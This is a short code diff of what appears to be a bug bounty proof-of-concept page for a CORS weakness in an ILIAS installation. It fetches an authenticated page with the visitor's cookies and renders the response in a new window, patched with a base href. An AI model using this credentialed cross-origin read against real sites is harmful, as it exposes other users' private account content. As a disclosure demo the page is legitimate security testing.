@@ -13,18 +13,17 @@
       fetch("https://intigriti.ilias-solutions.com/intigriti/assmgmt/", {
         credentials: "include"
       })
-      .then(res => res.text())
-      .then(html => {
-        const iframe = document.getElementById('corsFrame');
-        const doc = iframe.contentDocument || iframe.contentWindow.document;
-        doc.open();
-        doc.write(html);
-        doc.close();
-      })
-      .catch(err => {
-        alert("CORS failed or blocked.");
-        console.error(err);
-      });
+        .then(r => r.text())
+        .then(html => {
+          // Patch relative paths to load from the real domain
+          const patchedHtml = html.replace(
+            /<head>/i,
+            `<head><base href="https://intigriti.ilias-solutions.com/intigriti/assmgmt/">`
+          );
+          const win = window.open();
+          win.document.write(patchedHtml);
+          win.document.close();
+        });
     }
   </script>
 </body>
